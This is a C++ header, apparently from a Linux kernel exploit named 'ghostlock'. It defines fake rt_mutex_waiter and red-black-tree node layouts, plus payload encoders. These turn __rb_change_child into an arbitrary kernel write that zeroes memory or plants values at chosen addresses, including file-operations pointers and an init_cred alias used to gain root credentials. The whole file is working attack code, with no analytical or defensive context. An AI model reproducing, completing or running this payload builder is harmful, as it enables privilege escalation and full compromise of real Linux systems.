#ifndef PAYLOAD_BUILDER_H
#define PAYLOAD_BUILDER_H

#include <cstddef>
#include <cstdint>


#include <cstddef>
#include <cstdint>
#include <span>
#include <type_traits>

namespace ghostlock::memory {
    /* Immutable description of one kernel write. `preserve_child` selects the
 * one-child erase layout; false selects the leaf/zero layout. */
    enum class WriteMode : int32_t {
        Disabled = 0,
        Zero = 1,
        Credential = 2,
    };

    struct WriteRequest final {
        std::uintptr_t target = 0;
        WriteMode mode = WriteMode::Disabled;
        bool preserve_child = false;

        [[nodiscard]] static constexpr WriteRequest make(std::uintptr_t target,
                                                         WriteMode mode,
                                                         bool leaf) noexcept {
            return WriteRequest{target, mode, !leaf};
        }
    };

    struct PayloadWriteLayout final {
        std::uintptr_t parent = 0;
        std::uintptr_t right = 0;
        std::uintptr_t left = 0;
        std::uintptr_t fops = 0;
        bool needs_credential_copy = false;
    };

    static_assert(std::is_standard_layout_v<WriteRequest>);
    static_assert(std::is_trivially_copyable_v<WriteRequest>);
    static_assert(offsetof(WriteRequest, target) == 0);
    static_assert(offsetof(WriteRequest, mode) == sizeof(std::uintptr_t));
    static_assert(std::is_standard_layout_v<PayloadWriteLayout>);
    static_assert(std::is_trivially_copyable_v<PayloadWriteLayout>);

    /* The waiter's tree entry, shared by the route's stamp and the compact
     * encoder. pointer: {pc = value, 0, target} -- the collateral lands in that
     * pointer's child slot. leaf/zero: {target - 8, 0, 0} -- childless, so
     * __rb_change_child writes NULL at *(target). */
    struct WaiterTreeStamp final {
        std::uintptr_t pc = 0;
        std::uintptr_t right = 0;
        std::uintptr_t left = 0;
    };

    [[nodiscard]] constexpr WaiterTreeStamp waiter_tree_stamp(
        const PayloadWriteLayout &layout) noexcept {
        if (layout.right) {
            return {.pc = layout.right, .right = 0, .left = layout.left};
        }
        return {.pc = layout.parent, .right = layout.right, .left = layout.left};
    }

    /* Fixed payload fragment sizes shared by the encoders and their callers. */
    inline constexpr std::size_t kCompactWaiterBytes = 0x30;

    /* The eleven words of the 5.x rt_mutex_waiter; both stack-stamp routes
     * build their strip from this one definition. */
    inline constexpr std::size_t kWaiterBytes = 0x58;
    inline constexpr std::size_t kWaiterWords =
            kWaiterBytes / sizeof(std::uint64_t);

    struct WaiterWords final {
        std::uintptr_t tree_pc = 0;
        std::uintptr_t tree_right = 0;
        std::uintptr_t tree_left = 0;
        std::uintptr_t pi_pc = 0;
        std::uintptr_t pi_right = 0;
        std::uintptr_t pi_left = 0;
        std::uintptr_t task = 0;
        std::uintptr_t lock = 0;
        std::uint64_t prio = 0;
        std::uint64_t deadline = 0;
        std::uint64_t ww_ctx = 0;
    };

    /* The pi triple parks at zero: a zero pi node stays out of every descent. */
    [[nodiscard]] inline WaiterWords waiter_words(
        const PayloadWriteLayout &layout, std::uintptr_t fake_task,
        std::uintptr_t lock_word, std::uint64_t prio) noexcept {
        const WaiterTreeStamp stamp = waiter_tree_stamp(layout);
        return WaiterWords{
            .tree_pc = stamp.pc,
            .tree_right = stamp.right,
            .tree_left = stamp.left,
            .pi_pc = 0,
            .pi_right = 0,
            .pi_left = 0,
            .task = fake_task,
            .lock = lock_word,
            .prio = prio,
            .deadline = 0,
            .ww_ctx = 0,
        };
    }

    /* Word i lands at offset + 8*i; every other byte is left untouched. */
    [[nodiscard]] bool encode_waiter_words(
        std::span<std::byte> buffer, std::size_t offset,
        const WaiterWords &words) noexcept;

    /* Bounds-checked encoders. They return false without modifying memory when
 * the destination cannot contain every field required by the layout. */
    [[nodiscard]] bool encode_compact_waiter(
        std::span<std::byte> waiter, const WriteRequest &request,
        const PayloadWriteLayout &layout) noexcept;

    [[nodiscard]] bool encode_multicast_waiter(
        std::span<std::byte> buffer, std::size_t waiter_offset,
        std::size_t task_offset, std::size_t lock_offset, std::uintptr_t fake_task,
        std::uintptr_t fake_lock) noexcept;
} // namespace ghostlock::memory

namespace ghostlock::memory {
    /* Resolve the request-dependent words shared by the three route encoders. */
    PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias);

    /* Encode the route-neutral compact waiter write arm. Value writes always use
 * {pc=value,right=0,left=target}; leaf writes use {pc=target-8,0,0}. */
    void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout);

    int32_t payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout);

    int32_t payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout);

    void build_multicast_waiter_payload(
        unsigned char *buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock);

    /* Fixed request/layout vectors, including the upstream unified compact arm. */
    int32_t payload_builder_fixed_vector_test(void);
} // namespace ghostlock::memory

#endif
